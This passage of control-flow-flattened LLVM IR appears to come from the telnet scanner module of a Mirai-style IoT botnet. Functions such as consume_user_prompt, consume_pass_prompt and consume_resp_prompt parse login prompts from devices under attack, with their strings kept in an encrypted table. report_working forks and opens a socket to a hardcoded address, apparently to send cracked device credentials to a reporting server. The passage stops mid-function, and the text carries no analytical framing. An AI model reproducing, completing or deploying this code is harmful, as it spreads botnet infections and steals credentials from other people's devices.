  store i8* %142, i8** %4, align 8
  %143 = load i32, i32* %3, align 4
  %144 = add nsw i32 %143, 3
  store i32 %144, i32* %3, align 4
  store i32 -1792275393, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1901317870, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 -1149806517, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 1540592698, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  store i32 355256417, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %3, align 4
  ret i32 %150

loopEnd:                                          ; preds = %148, %147, %146, %145, %135, %132, %131, %130, %125, %116, %111, %102, %98, %97, %96, %90, %89, %74, %73, %66, %65, %57, %50, %45, %38, %37, %31, %25, %24, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub nsw i32 %13, 1
  store i32 %14, i32* %5, align 4
  %switchVar = alloca i32
  store i32 236894718, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 236894718, label %15
    i32 1800048553, label %19
    i32 187312297, label %29
    i32 -1342431039, label %39
    i32 -151320736, label %49
    i32 1464155812, label %59
    i32 -1041785206, label %69
    i32 -2031317541, label %72
    i32 -1167804162, label %73
    i32 127545726, label %76
    i32 -1679794140, label %80
    i32 -102852528, label %96
    i32 -1288765107, label %98
    i32 -204293669, label %112
    i32 -553478656, label %114
    i32 -1641237772, label %115
    i32 1193176670, label %116
    i32 1665063653, label %120
    i32 -41743415, label %121
    i32 -45628509, label %123
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %5, align 4
  %17 = icmp sgt i32 %16, 0
  %18 = select i1 %17, i32 1800048553, i32 127545726
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 7
  %22 = load i32, i32* %5, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = icmp eq i32 %26, 58
  %28 = select i1 %27, i32 -1041785206, i32 187312297
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 7
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [256 x i8], [256 x i8]* %31, i64 0, i64 %33
  %35 = load i8, i8* %34, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp eq i32 %36, 62
  %38 = select i1 %37, i32 -1041785206, i32 -1342431039
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 7
  %42 = load i32, i32* %5, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp eq i32 %46, 36
  %48 = select i1 %47, i32 -1041785206, i32 -151320736
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %51 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %50, i32 0, i32 7
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %51, i64 0, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 35
  %58 = select i1 %57, i32 -1041785206, i32 1464155812
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 7
  %62 = load i32, i32* %5, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [256 x i8], [256 x i8]* %61, i64 0, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %66, 37
  %68 = select i1 %67, i32 -1041785206, i32 -2031317541
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %6, align 4
  store i32 127545726, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 -1167804162, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %5, align 4
  %75 = add nsw i32 %74, -1
  store i32 %75, i32* %5, align 4
  store i32 236894718, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i32, i32* %6, align 4
  %78 = icmp eq i32 %77, -1
  %79 = select i1 %78, i32 -1679794140, i32 1193176670
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %81 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %81, i8** %9, align 8
  %82 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %82, i8** %10, align 8
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %84 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %83, i32 0, i32 7
  %85 = getelementptr inbounds [256 x i8], [256 x i8]* %84, i32 0, i32 0
  %86 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %86, i32 0, i32 6
  %88 = load i32, i32* %87, align 4
  %89 = load i8*, i8** %9, align 8
  %90 = load i32, i32* %8, align 4
  %91 = sub nsw i32 %90, 1
  %92 = call i32 @util_memsearch(i8* %85, i32 %88, i8* %89, i32 %91)
  %93 = icmp ne i32 %92, -1
  %94 = zext i1 %93 to i32
  store i32 %94, i32* %7, align 4
  %95 = select i1 %93, i32 -102852528, i32 -1288765107
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %7, align 4
  store i32 %97, i32* %6, align 4
  store i32 -1641237772, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %100 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %99, i32 0, i32 7
  %101 = getelementptr inbounds [256 x i8], [256 x i8]* %100, i32 0, i32 0
  %102 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %103 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %102, i32 0, i32 6
  %104 = load i32, i32* %103, align 4
  %105 = load i8*, i8** %10, align 8
  %106 = load i32, i32* %8, align 4
  %107 = sub nsw i32 %106, 1
  %108 = call i32 @util_memsearch(i8* %101, i32 %104, i8* %105, i32 %107)
  %109 = icmp ne i32 %108, -1
  %110 = zext i1 %109 to i32
  store i32 %110, i32* %7, align 4
  %111 = select i1 %109, i32 -204293669, i32 -553478656
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %7, align 4
  store i32 %113, i32* %6, align 4
  store i32 -553478656, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 -1641237772, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 1193176670, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %117 = load i32, i32* %6, align 4
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 1665063653, i32 -41743415
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -45628509, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %6, align 4
  store i32 %122, i32* %2, align 4
  store i32 -45628509, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %2, align 4
  ret i32 %124

loopEnd:                                          ; preds = %121, %120, %116, %115, %114, %112, %98, %96, %80, %76, %73, %72, %69, %59, %49, %39, %29, %19, %15, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub nsw i32 %12, 1
  store i32 %13, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1970327044, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1970327044, label %14
    i32 -698860233, label %18
    i32 -1386377527, label %28
    i32 1609527051, label %38
    i32 1980869653, label %48
    i32 -1486968944, label %58
    i32 -877847330, label %61
    i32 -282538504, label %62
    i32 -865036693, label %65
    i32 -965632207, label %69
    i32 -1547743163, label %84
    i32 1032726938, label %86
    i32 -15039521, label %87
    i32 -538793894, label %91
    i32 -787340985, label %92
    i32 -1308438302, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %5, align 4
  %16 = icmp sgt i32 %15, 0
  %17 = select i1 %16, i32 -698860233, i32 -865036693
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 7
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [256 x i8], [256 x i8]* %20, i64 0, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 58
  %27 = select i1 %26, i32 -1486968944, i32 -1386377527
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 7
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 62
  %37 = select i1 %36, i32 -1486968944, i32 1609527051
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 7
  %41 = load i32, i32* %5, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [256 x i8], [256 x i8]* %40, i64 0, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp eq i32 %45, 36
  %47 = select i1 %46, i32 -1486968944, i32 1980869653
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 7
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %50, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 35
  %57 = select i1 %56, i32 -1486968944, i32 -877847330
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %6, align 4
  store i32 -865036693, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -282538504, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, -1
  store i32 %64, i32* %5, align 4
  store i32 1970327044, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %6, align 4
  %67 = icmp eq i32 %66, -1
  %68 = select i1 %67, i32 -965632207, i32 -15039521
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 25)
  %70 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %70, i8** %7, align 8
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 7
  %73 = getelementptr inbounds [256 x i8], [256 x i8]* %72, i32 0, i32 0
  %74 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %75 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %74, i32 0, i32 6
  %76 = load i32, i32* %75, align 4
  %77 = load i8*, i8** %7, align 8
  %78 = load i32, i32* %9, align 4
  %79 = sub nsw i32 %78, 1
  %80 = call i32 @util_memsearch(i8* %73, i32 %76, i8* %77, i32 %79)
  %81 = icmp ne i32 %80, -1
  %82 = zext i1 %81 to i32
  store i32 %82, i32* %8, align 4
  %83 = select i1 %81, i32 -1547743163, i32 1032726938
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %8, align 4
  store i32 %85, i32* %6, align 4
  store i32 1032726938, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  store i32 -15039521, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 25)
  %88 = load i32, i32* %6, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 -538793894, i32 -787340985
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1308438302, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i32, i32* %6, align 4
  store i32 %93, i32* %2, align 4
  store i32 -1308438302, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %2, align 4
  ret i32 %95

loopEnd:                                          ; preds = %92, %91, %87, %86, %84, %69, %65, %62, %61, %58, %48, %38, %28, %18, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 6
  %9 = load i32, i32* %8, align 4
  %10 = sub nsw i32 %9, 1
  store i32 %10, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -535799295, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -535799295, label %11
    i32 -1014017716, label %15
    i32 396148883, label %25
    i32 1134636658, label %35
    i32 528698916, label %45
    i32 2104928529, label %55
    i32 1324740815, label %65
    i32 1027310386, label %68
    i32 304469706, label %69
    i32 -1828068383, label %72
    i32 -1972183181, label %76
    i32 -957022919, label %77
    i32 -34869685, label %79
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = icmp sgt i32 %12, 0
  %14 = select i1 %13, i32 -1014017716, i32 -1828068383
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [256 x i8], [256 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = sext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  %24 = select i1 %23, i32 1324740815, i32 396148883
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [256 x i8], [256 x i8]* %27, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 62
  %34 = select i1 %33, i32 1324740815, i32 1134636658
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp eq i32 %42, 36
  %44 = select i1 %43, i32 1324740815, i32 528698916
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 7
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [256 x i8], [256 x i8]* %47, i64 0, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 35
  %54 = select i1 %53, i32 1324740815, i32 2104928529
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %57 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %56, i32 0, i32 7
  %58 = load i32, i32* %5, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [256 x i8], [256 x i8]* %57, i64 0, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp eq i32 %62, 37
  %64 = select i1 %63, i32 1324740815, i32 1027310386
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %5, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %6, align 4
  store i32 -1828068383, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 304469706, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, -1
  store i32 %71, i32* %5, align 4
  store i32 -535799295, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %6, align 4
  %74 = icmp eq i32 %73, -1
  %75 = select i1 %74, i32 -1972183181, i32 -957022919
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -34869685, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %6, align 4
  store i32 %78, i32* %2, align 4
  store i32 -34869685, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %2, align 4
  ret i32 %80

loopEnd:                                          ; preds = %77, %76, %72, %69, %68, %65, %55, %45, %35, %25, %15, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 10, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1007983065, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1007983065, label %first
    i32 -262788429, label %20
    i32 203368558, label %21
    i32 -1483258428, label %36
    i32 946888471, label %37
    i32 2008046096, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp ne i32 %.reload, -1
  %19 = select i1 %18, i32 -262788429, i32 203368558
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  store i32 2008046096, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %22 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %22, i8** %4, align 8
  %23 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %24 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %23, i32 0, i32 7
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %24, i32 0, i32 0
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 6
  %28 = load i32, i32* %27, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %6, align 4
  %31 = sub nsw i32 %30, 1
  %32 = call i32 @util_memsearch(i8* %25, i32 %28, i8* %29, i32 %31)
  store i32 %32, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %33 = load i32, i32* %5, align 4
  %34 = icmp eq i32 %33, -1
  %35 = select i1 %34, i32 -1483258428, i32 946888471
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 2008046096, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %5, align 4
  store i32 %38, i32* %2, align 4
  store i32 2008046096, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  ret i32 %40

loopEnd:                                          ; preds = %37, %36, %21, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -124022968, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -124022968, label %first
    i32 -1153482690, label %16
    i32 967882379, label %20
    i32 -809674235, label %21
    i32 1643995915, label %25
    i32 1985434865, label %26
    i32 589941533, label %43
    i32 -1637907851, label %46
    i32 -1451951048, label %83
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 967882379, i32 -1153482690
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %8, align 4
  %18 = icmp eq i32 %17, -1
  %19 = select i1 %18, i32 967882379, i32 -809674235
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 -1451951048, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %22, i32* %9, align 4
  %23 = icmp eq i32 %22, -1
  %24 = select i1 %23, i32 1643995915, i32 1985434865
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  store i32 1985434865, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 2)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = call i32 @inet_addr(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.33, i32 0, i32 0)) #6
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %30 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %29, i32 0, i32 0
  store i32 %28, i32* %30, align 4
  %31 = call i8* @table_retrieve_val(i32 2, i32* null)
  %32 = bitcast i8* %31 to i16*
  %33 = load i16, i16* %32, align 2
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  call void @table_lock_val(i8 zeroext 2)
  %35 = load i32, i32* %9, align 4
  %36 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
